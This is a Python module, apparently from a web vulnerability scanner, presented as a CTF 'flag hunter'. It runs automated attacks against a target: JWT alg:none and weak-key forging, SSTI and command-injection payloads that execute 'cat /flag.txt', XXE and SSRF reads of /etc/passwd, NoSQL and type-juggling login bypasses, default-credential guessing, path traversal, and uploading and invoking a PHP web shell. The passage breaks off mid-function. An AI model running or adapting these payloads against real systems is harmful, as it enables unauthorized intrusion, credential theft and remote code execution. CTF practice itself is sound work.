"""
CTF Flag Hunter — main module.
Runs all CTF-specific techniques (A–Z + JS analysis + crawler + admin panels).
Only triggers on scan_type == "ctf".
"""
from __future__ import annotations

import asyncio
import base64
import json
import re
import time
from typing import TYPE_CHECKING
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

import httpx

from app.scanner.base import Finding, ScanResult
from app.scanner.flag_extractor import (
    build_flag_pattern,
    extract_flags,
    search_flags_in_response,
    search_flags_decoded,
)

if TYPE_CHECKING:
    from app.scanner.context import ScanContext


# ── HTTP client factory ───────────────────────────────────────────────────────

def _client(timeout: int = 10) -> httpx.Client:
    return httpx.Client(
        timeout=timeout,
        follow_redirects=True,
        verify=False,
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"},
    )


def _get(url: str, timeout: int = 10, **kwargs) -> tuple[int, str, dict]:
    """GET → (status, body, headers). Never raises."""
    try:
        with _client(timeout) as c:
            r = c.get(url, **kwargs)
            return r.status_code, r.text, dict(r.headers)
    except Exception:
        return 0, "", {}


def _post(url: str, data=None, json_body=None, timeout: int = 10, **kwargs) -> tuple[int, str, dict]:
    try:
        with _client(timeout) as c:
            r = c.post(url, data=data, json=json_body, **kwargs)
            return r.status_code, r.text, dict(r.headers)
    except Exception:
        return 0, "", {}


def _flag_finding(flag: str, technique: str, url: str, detail: str = "") -> Finding:
    return Finding(
        type="flag",
        title=f"FLAG CAPTURED: {flag}",
        severity="critical",
        description=(
            f"Flag found via {technique}.\n\n"
            f"URL: {url}\n"
            f"Flag: {flag}\n"
            + (f"\nDetail: {detail}" if detail else "")
        ),
        evidence=f"flag={flag} url={url} technique={technique}",
        cvss_score=10.0,
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
        remediation="CTF challenge solved.",
    )


def _base_url(target: str) -> str:
    """Normalise target to http(s)://host[:port]"""
    if target.startswith(("http://", "https://")):
        p = urlparse(target)
        return f"{p.scheme}://{p.netloc}"
    return f"http://{target}"


# ── Technique A: Common CTF paths ─────────────────────────────────────────────

_CTF_PATHS = [
    "/flag", "/flag.txt", "/flag.php", "/flag.html", "/secret", "/secret.txt",
    "/key", "/key.txt", "/answer", "/answer.txt", "/hidden", "/.hidden",
    "/admin/flag", "/api/flag", "/api/secret", "/api/key", "/debug",
    "/console", "/backup", "/backup.zip", "/source.zip", "/source",
    "/download", "/robots.txt", "/phpinfo.php", "/info.php", "/test.php",
    "/.env", "/.env.backup", "/.env.local", "/.env.prod", "/.env.example",
    "/config.php", "/config.js", "/config.json", "/app.py", "/app.py.bak",
    "/index.php.bak", "/index.php~", "/web.config", "/web.config.bak",
    "/.index.php.swp", "/dump.sql", "/db.sql", "/database.sql",
    "/requirements.txt", "/package.json", "/composer.json", "/Dockerfile",
    "/docker-compose.yml", "/docker-compose.yaml",
    "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
    "/proc/self/environ", "/etc/flag", "/var/flag", "/home/flag.txt",
    "/app/flag.txt", "/var/www/html/flag.txt", "/srv/flag.txt",
    "/static/flag.txt", "/uploads/flag.txt", "/files/flag.txt",
    "/api/v1/flag", "/api/v2/flag", "/api/internal/flag",
    "/admin", "/administrator", "/manage", "/panel", "/dashboard",
    "/wp-admin", "/phpmyadmin", "/adminer.php",
]


def _tech_a_paths(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    for path in _CTF_PATHS:
        url = base + path
        status, body, headers = _get(url, timeout=8)
        if status in (200, 301, 302) and body:
            flags = search_flags_decoded(body, pattern)
            for f in flags:
                findings.append(_flag_finding(f, "Common CTF path probe", url))
            # Also save interesting files even without flag pattern
            if status == 200 and not flags and any(
                kw in path for kw in (".env", "config", ".git", "backup", "dump", "source")
            ) and len(body) > 10:
                findings.append(Finding(
                    type="source_leak",
                    title=f"Sensitive file exposed: {path}",
                    severity="high",
                    description=f"File {path} is publicly accessible.\nContent (first 500 chars):\n{body[:500]}",
                    evidence=f"url={url} size={len(body)}",
                    cvss_score=7.5,
                    remediation="Restrict access to sensitive files. Remove from web root.",
                ))
    return findings


# ── Technique B: .git reconstruction ─────────────────────────────────────────

def _tech_b_git(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    git_files = [
        "/.git/HEAD", "/.git/config", "/.git/COMMIT_EDITMSG",
        "/.git/description", "/.git/info/exclude",
        "/.git/logs/HEAD", "/.git/refs/heads/master",
        "/.git/refs/heads/main",
    ]
    combined = ""
    for gf in git_files:
        _, body, _ = _get(base + gf, timeout=6)
        combined += body + "\n"

    flags = extract_flags(combined, pattern)
    for f in flags:
        findings.append(_flag_finding(f, ".git file leak", base + "/.git/"))

    # Try to list pack objects
    _, idx_body, _ = _get(base + "/.git/objects/info/packs", timeout=6)
    if idx_body and "pack-" in idx_body:
        pack_name = re.search(r"pack-([0-9a-f]{40})", idx_body)
        if pack_name:
            pack_url = f"{base}/.git/objects/pack/pack-{pack_name.group(1)}.pack"
            _, pack_body, _ = _get(pack_url, timeout=15)
            flags2 = extract_flags(pack_body, pattern)
            for f in flags2:
                findings.append(_flag_finding(f, ".git pack file", pack_url))

    return findings


# ── Technique C: JWT attack ───────────────────────────────────────────────────

_JWT_WEAK_KEYS = [
    "secret", "password", "key", "jwt", "flag", "ctf", "admin",
    "test", "123456", "qwerty", "letmein", "", "token", "change_me",
    "supersecret", "mysecret", "jwttoken", "hackme", "p@ssw0rd",
]


def _decode_jwt(token: str) -> dict | None:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload = parts[1] + "==="
        decoded = base64.urlsafe_b64decode(payload).decode("utf-8", errors="ignore")
        return json.loads(decoded)
    except Exception:
        return None


def _make_jwt_none(token: str) -> str:
    """Create alg:none variant."""
    try:
        parts = token.split(".")
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "===").decode())
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
        return f"{new_header}.{parts[1]}."
    except Exception:
        return ""


def _make_jwt_admin(token: str, key: str = "secret") -> str:
    """Sign a new JWT with admin claims using python-jose if available."""
    try:
        from jose import jwt as jose_jwt
        payload = _decode_jwt(token) or {}
        payload.update({"admin": True, "role": "admin", "isAdmin": True,
                        "is_superuser": True, "user_id": 1, "id": 1})
        # Remove expiry to avoid issues
        payload.pop("exp", None)
        return jose_jwt.encode(payload, key, algorithm="HS256")
    except Exception:
        return ""


def _tech_c_jwt(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    jwt_re = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

    # Collect JWTs from findings evidence/description
    tokens_seen: set[str] = set()
    combined_text = " ".join((f.evidence or "") + " " + (f.description or "") for f in all_findings)
    for m in jwt_re.finditer(combined_text):
        tokens_seen.add(m.group(0))

    # Also check login endpoint for JWT in response
    for endpoint in ["/login", "/api/login", "/auth", "/api/auth", "/token"]:
        _, body, headers = _get(base + endpoint, timeout=6)
        for m in jwt_re.finditer(body + str(headers)):
            tokens_seen.add(m.group(0))

    for token in tokens_seen:
        # Check if flag is already in payload
        payload = _decode_jwt(token)
        if payload:
            flag_in_payload = extract_flags(json.dumps(payload), pattern)
            for f in flag_in_payload:
                findings.append(_flag_finding(f, "JWT payload decode", base, f"payload={payload}"))

        # alg:none attack
        none_token = _make_jwt_none(token)
        if none_token:
            for ep in ["/api/flag", "/admin", "/api/admin", "/dashboard", "/profile", "/api/me"]:
                _, body, headers = _get(
                    base + ep, timeout=6,
                    headers={"Authorization": f"Bearer {none_token}",
                             "Cookie": f"token={none_token}; jwt={none_token}"},
                )
                flags = search_flags_decoded(body, pattern)
                for f in flags:
                    findings.append(_flag_finding(f, "JWT alg:none attack", base + ep))

        # Weak key brute
        for weak_key in _JWT_WEAK_KEYS:
            admin_token = _make_jwt_admin(token, weak_key)
            if not admin_token:
                continue
            for ep in ["/api/flag", "/admin", "/api/admin", "/flag", "/secret"]:
                _, body, _ = _get(
                    base + ep, timeout=6,
                    headers={"Authorization": f"Bearer {admin_token}",
                             "Cookie": f"token={admin_token}"},
                )
                flags = search_flags_decoded(body, pattern)
                for f in flags:
                    findings.append(_flag_finding(
                        f, f"JWT weak key ({weak_key!r})", base + ep,
                        f"key={weak_key!r} token={admin_token[:40]}..."
                    ))
                if flags:
                    break

    return findings


# ── Technique D: IDOR enumeration ─────────────────────────────────────────────

_IDOR_PARAMS = ["id", "user_id", "note_id", "post_id", "item_id", "flag_id",
                "challenge_id", "doc_id", "file_id", "record_id"]
_IDOR_PATHS = ["/user/{}", "/users/{}", "/note/{}", "/notes/{}", "/post/{}", "/posts/{}", "/item/{}", "/flag/{}", "/api/user/{}", "/api/users/{}", "/api/note/{}", "/api/notes/{}", "/api/flag/{}", "/api/item/{}"]


def _tech_d_idor(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    tried: set[str] = set()

    def _probe(url: str) -> list[str]:
        if url in tried:
            return []
        tried.add(url)
        _, body, _ = _get(url, timeout=6)
        return search_flags_decoded(body, pattern)

    # From discovered URLs in findings
    url_re = re.compile(r"https?://[^\s\"'<>]+")
    id_re = re.compile(r"[?&](" + "|".join(_IDOR_PARAMS) + r")=(\d+)", re.I)
    path_id_re = re.compile(r"/(users?|notes?|posts?|items?|flags?|challenges?)/(\d+)", re.I)

    for f in all_findings:
        text = (f.evidence or "") + " " + (f.description or "") + " " + (f.title or "")
        for url_m in url_re.finditer(text):
            url = url_m.group(0).rstrip(".,)")
            # param-based
            for m in id_re.finditer(url):
                param, val = m.group(1), int(m.group(2))
                for test_id in range(max(1, val - 2), min(200, val + 50)):
                    test_url = re.sub(
                        rf"([?&]{re.escape(param)}=)\d+", rf"\g<1>{test_id}", url
                    )
                    for flag in _probe(test_url):
                        findings.append(_flag_finding(flag, f"IDOR param {param}={test_id}", test_url))

    # Path-based IDOR on common endpoints
    for tmpl in _IDOR_PATHS:
        for i in list(range(1, 51)) + [0, -1, 99999, 100, 1000]:
            url = base + tmpl.format(i)
            for flag in _probe(url):
                findings.append(_flag_finding(flag, f"IDOR path enum id={i}", url))

    return findings


# ── Technique E: SSTI inline probe ───────────────────────────────────────────

_SSTI_PROBES = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
]

_SSTI_RCE_PAYLOADS = [
    # Jinja2
    "{{''.__class__.__mro__[1].__subclasses__()}}" ,
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/flag').read()}}",
    # Twig
    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag.txt')}}",
    # Freemarker
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag.txt")}',
]


def _tech_e_ssti(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    param_url_re = re.compile(r"(https?://[^\s\"'<>]+\?[^\s\"'<>]+)", re.I)
    tested_urls: set[str] = set()

    candidates: list[str] = []
    for f in all_findings:
        for m in param_url_re.finditer((f.evidence or "") + " " + (f.title or "")):
            candidates.append(m.group(1))
    candidates = candidates[:15]

    for url in candidates:
        if url in tested_urls:
            continue
        tested_urls.add(url)
        # Find a param to inject
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            continue
        param_name = list(params.keys())[0]

        for probe, expected in _SSTI_PROBES:
            test_url = url.split("?")[0] + "?" + param_name + "=" + probe
            _, body, _ = _get(test_url, timeout=8)
            if expected in body:
                # SSTI confirmed — try RCE payloads
                for rce in _SSTI_RCE_PAYLOADS:
                    rce_url = url.split("?")[0] + "?" + param_name + "=" + rce
                    _, rce_body, _ = _get(rce_url, timeout=10)
                    flags = search_flags_decoded(rce_body, pattern)
                    for flag in flags:
                        findings.append(_flag_finding(flag, "SSTI RCE", rce_url, f"probe={probe}"))
                    if not flags and rce_body.strip():
                        # save SSTI finding even without flag
                        findings.append(Finding(
                            type="ssti",
                            title=f"SSTI confirmed: {url[:80]}",
                            severity="critical",
                            description=f"SSTI confirmed with probe {probe!r} (got {expected!r}).\nRCE output: {rce_body[:300]}",
                            evidence=f"url={rce_url} probe={probe}",
                            cvss_score=9.8,
                        ))
                break

    # Also test headers
    for ep in ["/", "/index", "/index.php", "/search", "/api"]:
        url = base + ep
        for probe, expected in _SSTI_PROBES[:3]:
            for header_name in ["User-Agent", "Referer", "X-Forwarded-For"]:
                _, body, _ = _get(url, timeout=6, headers={header_name: probe})
                if expected in body:
                    findings.append(Finding(
                        type="ssti",
                        title=f"SSTI in header {header_name}: {url}",
                        severity="critical",
                        description=f"SSTI via {header_name} header with probe {probe!r}",
                        evidence=f"url={url} header={header_name} probe={probe}",
                        cvss_score=9.8,
                    ))

    return findings


# ── Technique F: XXE ──────────────────────────────────────────────────────────

_XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]><foo>&xxe;</foo>', "/flag.txt"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag">]><foo>&xxe;</foo>', "/flag"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/flag">]><foo>&xxe;</foo>', "/etc/flag"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///var/flag">]><foo>&xxe;</foo>', "/var/flag"),
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "/etc/passwd"),
]


def _tech_f_xxe(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    xml_endpoints: list[str] = []

    # Find XML endpoints from findings
    for f in all_findings:
        text = (f.evidence or "") + " " + (f.description or "")
        if any(kw in text.lower() for kw in ["xml", "soap", "wsdl", "upload", ".xml"]):
            url_m = re.search(r"https?://[^\s\"'<>]+", text)
            if url_m:
                xml_endpoints.append(url_m.group(0))

    # Also probe known XML endpoints
    for ep in ["/api", "/api/v1", "/upload", "/parse", "/xml", "/soap", "/service"]:
        xml_endpoints.append(base + ep)

    xml_endpoints = list(dict.fromkeys(xml_endpoints))[:10]

    for endpoint in xml_endpoints:
        for payload, target_file in _XXE_PAYLOADS:
            _, body, _ = _post(
                endpoint,
                data=payload.encode(),
                timeout=8,
                headers={"Content-Type": "application/xml"},
            )
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"XXE ({target_file})", endpoint))
            # Check for /etc/passwd (confirms XXE even without flag)
            if "root:" in body and ":0:0:" in body:
                findings.append(Finding(
                    type="xxe",
                    title=f"XXE: /etc/passwd read via {endpoint}",
                    severity="critical",
                    description=f"XXE confirmed: read /etc/passwd\n{body[:400]}",
                    evidence=f"url={endpoint} payload={payload[:100]}",
                    cvss_score=9.1,
                    remediation="Disable external entity processing in XML parser.",
                ))

    return findings


# ── Technique G: SSRF probe ───────────────────────────────────────────────────

_SSRF_PARAMS = ["url", "src", "dest", "redirect", "path", "uri", "link",
                "target", "host", "endpoint", "proxy", "image", "img",
                "load", "fetch", "open", "file", "resource"]
_SSRF_PAYLOADS = [
    "file:///flag.txt", "file:///flag", "file:///etc/flag",
    "file:///var/www/html/flag.txt", "file:///app/flag.txt",
    "file:///etc/passwd", "file:///proc/self/environ",
]


def _tech_g_ssrf(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    param_re = re.compile(r"[?&](" + "|".join(_SSRF_PARAMS) + r")=([^&\s]+)", re.I)

    tested: set[str] = set()
    urls_to_test: list[str] = []

    for f in all_findings:
        text = (f.evidence or "") + " " + (f.title or "")
        for m in re.finditer(r"https?://[^\s\"'<>]+", text):
            url = m.group(0).rstrip(".,)")
            if param_re.search(url):
                urls_to_test.append(url)

    for url in urls_to_test[:10]:
        for m in param_re.finditer(url):
            param = m.group(1)
            for payload in _SSRF_PAYLOADS:
                test_url = re.sub(
                    rf"([?&]{re.escape(param)}=)[^&\s]*",
                    rf"\g<1>{payload}",
                    url,
                )
                if test_url in tested:
                    continue
                tested.add(test_url)
                _, body, _ = _get(test_url, timeout=8)
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"SSRF ({payload})", test_url, f"param={param}"))
                if "root:" in body and ":/bin/" in body:
                    findings.append(Finding(
                        type="ssrf",
                        title=f"SSRF: /etc/passwd read via param {param}",
                        severity="critical",
                        description=f"SSRF confirmed: {test_url}\n{body[:300]}",
                        evidence=f"url={test_url}",
                        cvss_score=9.1,
                    ))

    return findings


# ── Technique H: Command injection probe ─────────────────────────────────────

_CMDI_PAYLOADS = [
    "; cat /flag.txt",
    "| cat /flag.txt",
    "`cat /flag.txt`",
    "$(cat /flag.txt)",
    "&& cat /flag.txt",
    "%0a cat /flag.txt",
    "; cat /flag",
    "| cat /flag",
    "; cat /etc/flag",
    "; id; cat /flag.txt",
]


def _tech_h_cmdi(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    param_url_re = re.compile(r"https?://[^\s\"'<>]+\?[^\s\"'<>]+", re.I)
    tested: set[str] = set()

    urls: list[str] = []
    for f in all_findings:
        for m in param_url_re.finditer((f.evidence or "") + " " + (f.title or "")):
            urls.append(m.group(0))
    urls = list(dict.fromkeys(urls))[:10]

    for url in urls:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param_name in list(params.keys())[:3]:
            for payload in _CMDI_PAYLOADS:
                test_url = url.split("?")[0] + "?" + param_name + "=" + payload
                if test_url in tested:
                    continue
                tested.add(test_url)
                _, body, _ = _get(test_url, timeout=8)
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"Command injection ({param_name})", test_url, f"payload={payload}"))

    # Also test in headers
    for ep in ["/", "/search", "/ping", "/exec", "/run", "/cmd"]:
        url = base + ep
        for payload in _CMDI_PAYLOADS[:4]:
            for header_name in ["User-Agent", "X-Forwarded-For", "Referer"]:
                _, body, _ = _get(url, timeout=6, headers={header_name: payload})
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"CMDi via header {header_name}", url, f"payload={payload}"))

    return findings


# ── Technique I: NoSQL injection ──────────────────────────────────────────────

_NOSQL_PAYLOADS = [
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
]


def _tech_i_nosql(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    login_eps = ["/login", "/api/login", "/auth/login", "/api/auth", "/signin", "/api/signin"]

    for ep in login_eps:
        url = base + ep
        for payload in _NOSQL_PAYLOADS:
            status, body, headers = _post(url, json_body=payload, timeout=8)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, "NoSQL injection login bypass", url, f"payload={payload}"))
            # Check for successful login (token in response)
            if status == 200 and any(kw in body.lower() for kw in ["token", "jwt", "session", "admin", "dashboard"]):
                findings.append(Finding(
                    type="nosql_injection",
                    title=f"NoSQL injection login bypass: {ep}",
                    severity="critical",
                    description=f"NoSQL injection bypassed authentication.\nPayload: {payload}\nResponse: {body[:400]}",
                    evidence=f"url={url} payload={json.dumps(payload)[:100]}",
                    cvss_score=9.8,
                    remediation="Sanitize user input before passing to database queries. Use parameterized queries.",
                ))

    # URL param-based NoSQL
    for ep in ["/api/users", "/api/data", "/api/search"]:
        for op in ["$gt", "$ne", "$regex", "$where"]:
            url = f"{base}{ep}?filter[{op}]="
            _, body, _ = _get(url, timeout=6)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"NoSQL operator injection ({op})", url))

    return findings


# ── Technique J: GraphQL ──────────────────────────────────────────────────────

_GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query", "/graphiql", "/playground"]
_GQL_INTROSPECTION = '{"query":"{__schema{types{name fields{name description}}}}"}'
_GQL_SIMPLE = '{"query":"{__typename}"}'
_FLAG_FIELD_NAMES = {"flag", "secret", "key", "token", "password", "answer", "hidden", "admin"}


def _tech_j_graphql(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []

    for ep in _GQL_ENDPOINTS:
        url = base + ep
        # Try introspection
        status, body, _ = _post(url, json_body=json.loads(_GQL_INTROSPECTION), timeout=10)
        if status != 200 or "types" not in body:
            _, body, _ = _post(url, data=_GQL_SIMPLE, timeout=6,
                               headers={"Content-Type": "application/json"})
            if "typename" not in body.lower():
                continue

        # Check introspection for flag-related fields
        try:
            data = json.loads(body)
            types = data.get("data", {}).get("__schema", {}).get("types", [])
            for t in types:
                for field in (t.get("fields") or []):
                    fname = (field.get("name") or "").lower()
                    if fname in _FLAG_FIELD_NAMES:
                        # Query the field
                        gql = f'{{"query":"{{{"query"} {{{fname}}}}}}"}}'
                        _, fld_body, _ = _post(url, json_body={"query": f"{{ {fname} }}"}, timeout=8)
                        flags = search_flags_decoded(fld_body, pattern)
                        for flag in flags:
                            findings.append(_flag_finding(flag, f"GraphQL field {fname!r}", url))
        except Exception:
            pass

        # Direct flag queries
        for fname in _FLAG_FIELD_NAMES:
            _, fld_body, _ = _post(url, json_body={"query": f"{{ {fname} }}"}, timeout=6)
            flags = search_flags_decoded(fld_body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"GraphQL direct query {fname!r}", url))

    return findings


# ── Technique K: File upload → shell ─────────────────────────────────────────

_PHP_SHELL = b"<?php system($_GET['cmd']); ?>"
_SHELL_EXTS = [".php", ".php5", ".phtml", ".pHp", ".PHP", ".php.jpg",
               ".php%00.jpg", ".phtml", ".php4", ".php7"]


def _tech_k_upload(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    upload_eps: list[str] = []

    # Find upload endpoints
    for f in all_findings:
        text = (f.title or "") + " " + (f.description or "") + " " + (f.evidence or "")
        if any(kw in text.lower() for kw in ["upload", "file", "attach", "import"]):
            for m in re.finditer(r"https?://[^\s\"'<>]+", text):
                upload_eps.append(m.group(0))

    for ep in ["/upload", "/api/upload", "/file/upload", "/upload.php", "/files"]:
        upload_eps.append(base + ep)

    upload_eps = list(dict.fromkeys(upload_eps))[:5]

    for ep in upload_eps:
        for ext in _SHELL_EXTS[:4]:
            fname = f"shell{ext}"
            try:
                with _client(15) as c:
                    r = c.post(ep, files={"file": (fname, _PHP_SHELL, "image/jpeg")})
                    if r.status_code in (200, 201):
                        # Find the uploaded file path in response
                        path_m = re.search(r"((?:/uploads?|/files?|/static)[^\s\"'<>]+)", r.text)
                        if path_m:
                            shell_url = base + path_m.group(1)
                            _, out, _ = _get(shell_url + "?cmd=cat+/flag.txt", timeout=8)
                            flags = search_flags_decoded(out, pattern)
                            for flag in flags:
                                findings.append(_flag_finding(flag, f"File upload RCE ({ext})", shell_url))
            except Exception:
                pass

    return findings


# ── Technique L: Mass assignment + HTTP param pollution ───────────────────────

_MASS_ASSIGN_FIELDS = [
    {"isAdmin": True, "role": "admin", "is_superuser": True},
    {"admin": True, "is_admin": True},
    {"role": "administrator"},
    {"privilege": "admin"},
    {"access_level": 99},
]


def _tech_l_mass_assign(base: str, pattern: re.Pattern, all_findings: list[Finding]) -> list[Finding]:
    findings: list[Finding] = []
    form_eps: list[str] = ["/register", "/api/register", "/signup", "/api/signup",
                           "/update", "/api/update", "/profile", "/api/profile",
                           "/api/user", "/user/update"]

    for ep in form_eps:
        url = base + ep
        for extra_fields in _MASS_ASSIGN_FIELDS:
            payload = {"username": "ctf_test", "password": "ctf1234", "email": "ctf@test.com"}
            payload.update(extra_fields)
            _, body, _ = _post(url, json_body=payload, timeout=6)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, "Mass assignment", url, f"extra={extra_fields}"))

    # HTTP Parameter Pollution
    for ep in ["/api/flag", "/admin", "/api/admin"]:
        url = base + ep
        _, body, _ = _get(url + "?admin=false&admin=true", timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "HTTP parameter pollution", url + "?admin=false&admin=true"))

    return findings


# ── Technique M: Path normalization bypass ────────────────────────────────────

_PATH_BYPASS_VARIANTS = [
    "/{target}/../{target}/",
    "/./{target}/",
    "//{target}/",
    "/{target}/.",
    "/%2f{target}/",
    "/{TARGET}/",
    "/{target}%2f",
    "/{target};/",
    "/{target}?anything",
    "/api/v1/../{target}/",
    "/api/v2/../{target}/",
    "/{target}%09",
    "/{target}..;/",
]

_PROTECTED_PATHS = ["admin", "administrator", "manage", "panel", "dashboard",
                    "flag", "secret", "internal", "debug", "config"]


def _tech_m_path_bypass(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []

    for path in _PROTECTED_PATHS:
        # First check if original returns 403/401
        orig_status, orig_body, _ = _get(base + "/" + path, timeout=6)
        if orig_status not in (401, 403):
            # Already accessible or not found
            if orig_status == 200:
                flags = search_flags_decoded(orig_body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, "Direct path access", base + "/" + path))
            continue

        for variant in _PATH_BYPASS_VARIANTS:
            bypass_path = variant.replace("{target}", path).replace("{TARGET}", path.upper())
            url = base + bypass_path
            status, body, _ = _get(url, timeout=6)
            if status == 200 and body != orig_body:
                flags = search_flags_decoded(body, pattern)
                for flag in flags:
                    findings.append(_flag_finding(flag, f"Path normalization bypass (/{path})", url))
                if not flags:
                    findings.append(Finding(
                        type="path_bypass",
                        title=f"403 bypass: /{path} via {bypass_path}",
                        severity="high",
                        description=f"Bypassed 403 on /{path} using {bypass_path}\nResponse: {body[:300]}",
                        evidence=f"url={url} original_status=403 bypass_status=200",
                        cvss_score=7.5,
                    ))

    return findings


# ── Technique N: Nginx/Apache misconfig ──────────────────────────────────────

_SERVER_MISCONFIG_PATHS = [
    "/static../etc/passwd",
    "/static../etc/flag",
    "/files/../../../../etc/flag",
    "/uploads/../flag.txt",
    "/assets/%2e%2e%2fetc%2fflag",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/flag",
    "/img/../../../etc/flag",
    "/css/../../../flag.txt",
]


def _tech_n_server_misconfig(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    for path in _SERVER_MISCONFIG_PATHS:
        _, body, _ = _get(base + path, timeout=6)
        flags = search_flags_decoded(body, pattern)
        for flag in flags:
            findings.append(_flag_finding(flag, "Server path traversal misconfig", base + path))
        if "root:" in body and ":/bin/" in body:
            findings.append(Finding(
                type="path_traversal",
                title=f"Server traversal: /etc/passwd read via {path}",
                severity="critical",
                description=f"Server misconfiguration allows path traversal.\n{body[:300]}",
                evidence=f"url={base + path}",
                cvss_score=9.1,
            ))
    return findings


# ── Technique O: Flask/Django debug ──────────────────────────────────────────

_DEBUG_ENDPOINTS = [
    "/console", "/?debug=1", "/?__debug__=1", "/_debug_toolbar/",
    "/debugger", "/werkzeug", "/__debug__", "/debug/",
]
_ADMIN_DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("admin", ""), ("root", "root"),
    ("administrator", "administrator"), ("test", "test"),
]


def _tech_o_debug(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []

    for ep in _DEBUG_ENDPOINTS:
        url = base + ep
        status, body, _ = _get(url, timeout=6)
        if status == 200:
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, "Debug/console endpoint", url))
            if any(kw in body.lower() for kw in ["werkzeug", "debugger", "console", "traceback"]):
                findings.append(Finding(
                    type="debug_exposure",
                    title=f"Debug interface exposed: {ep}",
                    severity="critical",
                    description=f"Interactive debug console accessible at {url}\n{body[:300]}",
                    evidence=f"url={url}",
                    cvss_score=10.0,
                    remediation="Disable debug mode in production. Never expose Werkzeug console.",
                ))

    # Django/Laravel admin with default creds
    for admin_ep in ["/admin/", "/wp-admin/", "/phpmyadmin/", "/adminer.php"]:
        for user, pwd in _ADMIN_DEFAULT_CREDS:
            _, body, _ = _post(
                base + admin_ep,
                data={"username": user, "password": pwd,
                      "csrfmiddlewaretoken": "csrf", "next": "/"},
                timeout=8,
            )
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
                findings.append(_flag_finding(flag, f"Admin default creds ({user}:{pwd})", base + admin_ep))

    return findings


# ── Technique P: Type juggling ────────────────────────────────────────────────

_TYPE_JUGGLING_PAYLOADS = [
    {"username": "admin", "password": "0"},
    {"username": "admin", "password": "0e215962017"},
    {"username": "admin", "password[]": "anything"},
    {"username[]": "admin", "password[]": "admin"},
    {"username": "admin", "password": True},
    {"username": "admin", "password": 0},
]


def _tech_p_type_juggling(base: str, pattern: re.Pattern) -> list[Finding]:
    findings: list[Finding] = []
    login_eps = ["/login", "/api/login", "/auth/login", "/signin"]

    for ep in login_eps:
        url = base + ep
        for payload in _TYPE_JUGGLING_PAYLOADS:
            _, body, headers = _post(url, json_body=payload, timeout=6)
            flags = search_flags_decoded(body, pattern)
            for flag in flags:
